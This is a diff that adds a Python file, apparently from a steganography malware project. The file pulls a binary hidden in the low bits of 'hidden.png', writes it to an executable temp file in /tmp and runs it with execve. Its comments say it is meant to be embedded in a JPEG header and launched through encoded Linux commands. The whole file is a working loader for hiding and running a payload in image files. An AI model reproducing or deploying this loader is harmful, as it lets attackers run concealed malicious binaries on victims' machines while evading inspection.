@@ -1,0 +1,95 @@
+python3
+
+# This is a copy of some functions from the file stego.py the reason for this file is to contain just the essential parts for 
+# the extraction of a payload using steganography in a single reduced file, this file what would be inserted into the jpeg header
+
+# The file payload_encoded contains this entire payload endoded using base64 together with the necessary linux commands to execute the payload
+
+import os, tempfile
+from PIL import Image
+
+def obtain_bits(value):
+    # Returns a list containing the binary representation of a value
+    bits = []
+    for i in range(7, -1, -1):
+        bits.append((value >> i) & 1)
+    
+    return bits
+
+
+def obtain_byte(bits):
+    # Given a list of bits calculate the decimal value of the corresponding byte
+    if len(bits) != 8:
+        print("Provided list is not a byte, length != 8")
+        return
+    
+    value = 0
+    for b in bits:
+        value = 2*value + b
+    
+    return value
+
+
+def extract_bits(byte, hide_pattern_list):
+    # Extract the bits indicated in hide_pattern_list
+    extraced = []
+    bits_from_byte = obtain_bits(byte)
+    for i in range(8):
+        if hide_pattern_list[i]: # If hide_patter_list[i] == 1
+            extraced.append(bits_from_byte[i])
+    
+    return extraced
+
+
+
+def recover_secret(file, payload_length, hide_pattern):
+
+    if hide_pattern == 0x00: # The pattern cannot be 0x00 because no bits would be replaced
+        print("Error, the provided pattern does not allow hiding")
+        return
+    
+    hide_pattern_list = obtain_bits(hide_pattern) # Store the hide_pattern binary representation in a list
+    
+    with Image.open(file) as img: 
+        img = img.convert("RGB")
+        img_bytes = bytearray(img.tobytes()) # Obtain a bytearray of RGB values
+
+    recovered_payload = []
+
+    recovered_bytes = 0
+    bits = []
+    current_byte = 0
+
+    while recovered_bytes < payload_length:
+        bits = bits + extract_bits(img_bytes[current_byte], hide_pattern_list) # Concat the extracted bits to our currently retrieved list
+        current_byte += 1
+
+        if len(bits) >= 8: # Whenever we extract at least 8 bits, take that byte and store it in recovered_payload
+            recovered_payload.append(obtain_byte(bits[:8]))
+            del bits[:8]
+            recovered_bytes += 1
+
+    
+    return bytes(recovered_payload) # Modified from stego.py the file will be written and loaded using the function load_and_exec (see mem_loader.py)
+
+
+def load_and_exec(src_bytes):
+    # Takes as argument a bytearray containing a binary and executes it
+    fd, path = tempfile.mkstemp(prefix="tmp_file_", dir="/tmp") # Create a temp_file in /tmp to store the binary
+    os.fchmod(fd, 0o700) # Add execution permissions
+    
+    view = memoryview(src_bytes) # This section copies the bytes from our bytearray to the newly created file in /tmp
+    while view:
+        n = os.write(fd, view)
+        view = view[n:]
+
+    os.close(fd)
+
+    # Execute the loaded binary
+    os.execve(path, ["tmp_file"], os.environ)
+
+
+# Here I will call the code that using the functions above extracts and executes the payload.
+# I will hardcode the file names and payload sizes and other vars used for the sake of simplicity:
+
+load_and_exec(recover_secret('hidden.png', 158632, 0x0f))
